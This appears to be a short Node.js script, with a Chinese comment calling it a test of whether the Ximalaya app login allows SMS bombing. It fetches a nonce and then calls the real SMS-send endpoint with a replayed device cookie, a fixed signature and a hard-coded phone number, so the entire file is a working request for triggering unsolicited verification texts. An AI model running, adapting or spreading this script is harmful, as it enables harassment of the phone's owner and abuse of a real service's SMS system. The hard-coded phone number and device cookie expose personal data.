/**
 * 测试喜马拉雅app端登录是否有短信轰炸
 * 
 */

 const superagent = require('superagent');

 (async function(){
     let time = new Date().getTime();
     console.log('TIME: ' + time);
     const { text } = await superagent.post(`passportws.ximalaya.com/mobile/nonce/${time}`).set('Cookie', '1&_device=android&1e4e1326-3ec3-3cb8-acfb-49790b67ee6f&6.5.91;channel=and-a1;impl=com.ximalaya.ting.android;osversion=22;device_model=RMX1931;XUM=AIF/5064;XIM=312dd294e92bf;c-oper=%E6%9C%AA%E7%9F%A5;net-mode=WIFI;res=1280%2C0;NSUP=42e8d20d%2C421faa67%2C1597577846181;AID=lknswLM3EjA=;manufacturer=realme;XD=YEJAmWTTPByeU9IvRvNxf7HA0ZYRkBM/5W0zMd5iP+FsraN5wQcmIPohwz2uiLy862dnQU6wdE8tiR0J4EC3wC5l1GlaELkgziqA8+ZvZFdZj9+4q9vcRxjivL8vbOyf5jcUV6auwb80u/x+sv7bccyPzWxq6m8sZn8Xp3c4fzY=;umid=161990e4e8ca3f49a771b243fe40f986;xm_grade=1;domain=.ximalaya.com;path=/;');
     const nonce = JSON.parse(text)['nonce'];
     console.log('NONCE: ' + nonce);

     const { text: data } = await superagent.post('passport.ximalaya.com/mobile/sms/send').send(JSON.stringify({
            "signature":"4e628ef25783c3fd61158089ec130d94b0705f5a",
            "sendType":"1",
            "mobile":"15570923294",
            "nonce":nonce
        })).set('Cookie', '1&_device=android&1e4e1326-3ec3-3cb8-acfb-49790b67ee6f&6.5.91;channel=and-a1;impl=com.ximalaya.ting.android;osversion=22;device_model=RMX1931;XUM=AIF/5064;XIM=312dd294e92bf;c-oper=%E6%9C%AA%E7%9F%A5;net-mode=WIFI;res=1280%2C0;NSUP=42e8d20d%2C421faa67%2C1597577846181;AID=lknswLM3EjA=;manufacturer=realme;XD=YEJAmWTTPByeU9IvRvNxf7HA0ZYRkBM/5W0zMd5iP+FsraN5wQcmIPohwz2uiLy862dnQU6wdE8tiR0J4EC3wC5l1GlaELkgziqA8+ZvZFdZj9+4q9vcRxjivL8vbOyf5jcUV6auwb80u/x+sv7bccyPzWxq6m8sZn8Xp3c4fzY=;umid=161990e4e8ca3f49a771b243fe40f986;xm_grade=1;domain=.ximalaya.com;path=/;');
     console.log(data);
 })();
